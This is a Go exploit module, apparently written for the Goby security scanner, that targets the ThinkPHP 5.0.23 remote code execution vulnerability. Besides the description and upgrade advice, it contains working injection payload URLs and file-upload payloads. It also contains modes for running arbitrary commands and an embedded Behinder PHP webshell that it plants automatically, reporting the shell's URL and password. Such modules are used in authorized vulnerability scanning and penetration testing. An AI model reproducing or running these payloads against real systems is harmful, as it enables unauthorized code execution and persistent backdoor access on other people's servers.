package exploits

import (
	"crypto/md5"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
)

func init() {
	expJson := `{
    "Name": "ThinkPHP 5.0.23 Remote Code Execution Vulnerability",
    "Description": "<p>ThinkPHP is a widely used PHP development framework.</p><p>In versions prior to ThinkPHP 5.0.23, the method for obtaining method did not handle the method name correctly, so that an attacker could call any method of the Request class and construct an exploit chain, resulting in a remote code execution vulnerability.</p>",
    "Product": "ThinkPHP",
    "Homepage": "https://www.thinkphp.cn/",
    "DisclosureDate": "2019-01-11",
    "Author": "992271865@qq.com",
    "FofaQuery": "((header=\"thinkphp\" || header=\"think_template\") && header!=\"couchdb\" && header!=\"St: upnp:rootdevice\") || body=\"href=\\\"http://www.thinkphp.cn\\\">ThinkPHP</a><sup>\" || ((banner=\"thinkphp\" || banner=\"think_template\") && banner!=\"couchdb\" && banner!=\"St: upnp:rootdevice\") || (body=\"ThinkPHP\" && body=\"internal function\") || header=\"think_var\" || body=\"grade-a platform-browser platform-win32 platform-ready\" || body=\"ThinkPHP\"",
    "GobyQuery": "((header=\"thinkphp\" || header=\"think_template\") && header!=\"couchdb\" && header!=\"St: upnp:rootdevice\") || body=\"href=\\\"http://www.thinkphp.cn\\\">ThinkPHP</a><sup>\" || ((banner=\"thinkphp\" || banner=\"think_template\") && banner!=\"couchdb\" && banner!=\"St: upnp:rootdevice\") || (body=\"ThinkPHP\" && body=\"internal function\") || header=\"think_var\" || body=\"grade-a platform-browser platform-win32 platform-ready\" || body=\"ThinkPHP\"",
    "Level": "3",
    "Impact": "<p>In versions prior to ThinkPHP 5.0.23, the method for obtaining method did not handle the method name correctly, so that an attacker could call any method of the Request class and construct an exploit chain, resulting in a remote code execution vulnerability.</p>",
    "Recommendation": "<p>The official has fixed the vulnerability, please upgrade to the latest version: <a href=\"http://www.thinkphp.cn/\">http://www.thinkphp.cn/</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://fofa.so/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "cmd,upload,auto"
        },
        {
            "name": "filePath",
            "type": "input",
            "value": "x.php",
            "show": "mode=upload"
        },
        {
            "name": "fileContext",
            "type": "input",
            "value": "",
            "show": "mode=upload"
        },
        {
            "name": "command",
            "type": "input",
            "value": "whoami",
            "show": "mode=cmd"
        },
        {
            "name": "func",
            "type": "input",
            "value": "system",
            "show": "mode=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Code Execution"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "ThinkPHP 5.0.23 远程代码执行漏洞",
            "Product": "ThinkPHP",
            "Description": "<p>ThinkPHP 是一款运用极广的 PHP 开发框架。</p><p>ThinkPHP 5.0.23 以前的版本中，获取 method 的方法中没有正确处理方法名，导致攻击者可以调用 Request 类任意方法并构造利用链，从而导致远程代码执行漏洞。</p>",
            "Recommendation": "<p>官⽅已修复该漏洞，请⽤户升级至最新版本：<a href=\"http://www.thinkphp.cn/\">http://www.thinkphp.cn/</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。<br></p>",
            "Impact": "<p>ThinkPHP 5.0.23 以前的版本中，获取 method 的方法中没有正确处理方法名，导致攻击者可以调用 Request 类任意方法并构造利用链，从而导致远程代码执行漏洞。<br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "ThinkPHP 5.0.23 Remote Code Execution Vulnerability",
            "Product": "ThinkPHP",
            "Description": "<p>ThinkPHP is a widely used PHP development framework.</p><p>In versions prior to ThinkPHP 5.0.23, the method for obtaining method did not handle the method name correctly, so that an attacker could call any method of the Request class and construct an exploit chain, resulting in a remote code execution vulnerability.</p>",
            "Recommendation": "<p>The official has fixed the vulnerability, please upgrade to the latest version: <a href=\"http://www.thinkphp.cn/\">http://www.thinkphp.cn/</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>In versions prior to ThinkPHP 5.0.23, the method for obtaining method did not handle the method name correctly, so that an attacker could call any method of the Request class and construct an exploit chain, resulting in a remote code execution vulnerability.<br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10711"
}`
	randSession := goutils.RandomHexString(24)
	doPost := func(u *httpclient.FixUrl, path, payload string) string {
		cfg := httpclient.NewPostRequestConfig(path)
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		cfg.Header.Store("Cookie", "PHPSESSID="+randSession)
		cfg.Data = payload
		if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
			return resp.RawBody
		}
		return ""
	}
	doGet := func(u *httpclient.FixUrl, path string) string {
		//fmt.Println(path)
		cfg := httpclient.NewGetRequestConfig(path)
		cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		cfg.Header.Store("Cookie", "PHPSESSID="+randSession)
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
			return resp.RawBody
		}
		return ""
	}
	
	Md5Str := func(str string) string {
		h := md5.New()
		h.Write([]byte(str))
		return hex.EncodeToString(h.Sum(nil))
	}

	behinderPhpShell := "<?php @error_reporting(0);session_start(); $key=\"{{PWD}}\"; $_SESSION['k']=$key; session_write_close(); $post=file_get_contents(\"php://input\");if(!extension_loaded('openssl')){$t=\"base64_\".\"decode\";$post=$t($post.\"\");for($i=0;$i<strlen($post);$i++) {     $post[$i] = $post[$i]^$key[$i+1&15];     }}else{$post=openssl_decrypt($post, \"AES128\", $key);} $arr=explode('|',$post); $func=$arr[0]; $params=$arr[1];class C{public function __invoke($p) {eval($p.\"\");}} @call_user_func(new C(),$params);?>"

	FlagAndShellContent := func(pwd string) (content string) {
		return strings.ReplaceAll(behinderPhpShell, "{{PWD}}", Md5Str(pwd)[:16])
	}

	BehinderShellsInfo := func(url, pwd string) string {
		info := "WebShell URL: " + url + "\n"
		info += "Password: " + pwd + "\n"
		info += "WebShell tool: Behinder v3.0"
		return info
	}

	randStr1 := goutils.RandomHexString(8)
	vulController := []string{
		"/index.php?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=%s&vars[1][]=%s|",
		//5.1.x
		"/index.php?s=index/\\think\\Request/input&filter[]=%s&data=%s|",
		"/index.php?s=index/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=%s&vars[1][]=%s|",
		"/index.php?s=index/\\think\\app/invokefunction|function=call_user_func_array&vars[0]=%s&vars[1][]=%s",
		//5.0.x-5.0.23
		"/index.php?s=captcha|_method=__construct&filter[]=%s&method=GET&server[REQUEST_METHOD]=%s&get[]=1",
		//5.1.x 低版本
		"/index.php?s=captcha|_method=__construct&filter[]=%s&s=%s&method=get",
		"/index.php?s=index|_method=__construct&filter[]=%s&method=GET&get[]=%s",
		"/index.php/captcha|_method=__construct&method=GET&filter[]=%s&get[]=%s",
		// ThinkPHP <= 5.0.23 或者 5.1.0 <= 5.1.16 需要开启框架app_debug
		"/|_method=__construct&filter[]=%s&server[REQUEST_METHOD]=%s",
		"/|get[]=%s&_method=__construct&method=get&filter=%s",
	}
	expUploadPayload := []string{
		`/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=${filePath}&vars[1][]=${fileContext}|`,
		`/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=${filePath}&vars[1][]=${fileContext}|`,
		`/index.php?s=captcha|_method=__construct&filter[]=think\Session::set&method=get&get[]=<%3fphp+$a%3d'file_put_contents'%3b$b%3d'base64_decode'%3b$a($b('${filePathBase64}'),$b('${fileContextBase64}'))%3b%3f>&server[]=1`,
		`/index.php?s=captcha|_method=__construct&method=GET&filter[]=think\__include_file&get[]=/tmp/sess_${random}&server[]=1`,
	}
	doUpload := func(target *httpclient.FixUrl, filename, fileContext string) (bool, string) {
		for _, payload := range expUploadPayload {
			payload = strings.ReplaceAll(payload, "${filePath}", url.QueryEscape(filename))
			payload = strings.ReplaceAll(payload, "${fileContext}", url.QueryEscape(fileContext))
			payload = strings.ReplaceAll(payload, "${random}", randSession)
			payload = strings.ReplaceAll(payload, "${filePathBase64}", url.QueryEscape(base64.StdEncoding.EncodeToString([]byte(filename))))
			payload = strings.ReplaceAll(payload, "${fileContextBase64}", url.QueryEscape(base64.StdEncoding.EncodeToString([]byte(fileContext))))
			arr := strings.Split(payload, "|")
			if arr[1] == "" {
				doGet(target, arr[0])
			} else {
				doPost(target, arr[0], arr[1])
			}
		}
		shellPath := target.String() + "/" + filename
		resp, err := httpclient.SimpleGet(shellPath)
		if err == nil {
			if resp.StatusCode == 200 {
				return true, shellPath
			}
		}
		return false, ""
	}

	//5.0.22/5.1.29 http://your-ip:8080/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1
	//5.0.23 _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostinfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			for _, v := range vulController {
				//poc check
				v = fmt.Sprintf(v, "printf", randStr1+"%25%25"+randStr1)
				vulArr := strings.Split(v, "|")
				if len(vulArr[1]) == 0 {
					if res := doGet(hostinfo, vulArr[0]); strings.Contains(res, randStr1+"%"+randStr1) {
						stepLogs.VulURL = hostinfo.FixedHostInfo + vulArr[0]
						return true
					}
				} else {
					if res := doPost(hostinfo, vulArr[0], vulArr[1]); strings.Contains(res, randStr1+"%"+randStr1) {
						stepLogs.VulURL = hostinfo.FixedHostInfo + vulArr[0]
						return true
					}
				}
			}

			return false
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			mode := stepLogs.Params["mode"].(string)
			switch mode {
			case "cmd":
				for _, v := range vulController {
					var funcName = url.QueryEscape(stepLogs.Params["func"].(string))
					var command = url.QueryEscape(stepLogs.Params["command"].(string))
					//poc check
					vToc := fmt.Sprintf(v, "printf", randStr1+"%25%25"+randStr1)
					vulArr := strings.Split(vToc, "|")
					if len(vulArr[1]) == 0 {
						if res := doGet(expResult.HostInfo, vulArr[0]); strings.Contains(res, randStr1+"%"+randStr1) {
							v = fmt.Sprintf(v, funcName, command)
							fmt.Println(v)
							vArr := strings.Split(v, "|")
							if res := doGet(expResult.HostInfo, vArr[0]); res != "" {
								expResult.Success = true
								expResult.Output = res
								return expResult
							}
						}
					} else {
						if res := doPost(expResult.HostInfo, vulArr[0], vulArr[1]); strings.Contains(res, randStr1+"%"+randStr1) {
							v = fmt.Sprintf(v, funcName, command)
							vArr := strings.Split(v, "|")
							if res := doPost(expResult.HostInfo, vArr[0], vArr[1]); res != "" {
								expResult.Success = true
								expResult.Output = res
								return expResult
							}
						}
					}
				}
				return expResult
			case "auto":
				filePath := randStr1 + ".php"
				pass := goutils.RandomHexString(8)
				shellContent := FlagAndShellContent(pass)
				if ok, shellPath := doUpload(expResult.HostInfo, filePath, shellContent); ok {
					expResult.Success = true
					expResult.Output = BehinderShellsInfo(shellPath, pass)
					return expResult
				}
				return expResult
			case "upload":
				filePath := stepLogs.Params["filePath"].(string)
				fileContext := stepLogs.Params["fileContext"].(string)
				if ok, shellPath := doUpload(expResult.HostInfo, filePath, fileContext); ok {
					expResult.Success = true
					expResult.Output = shellPath
					return expResult
				}
				return expResult
			default:
				return expResult
			}
		},
	))
}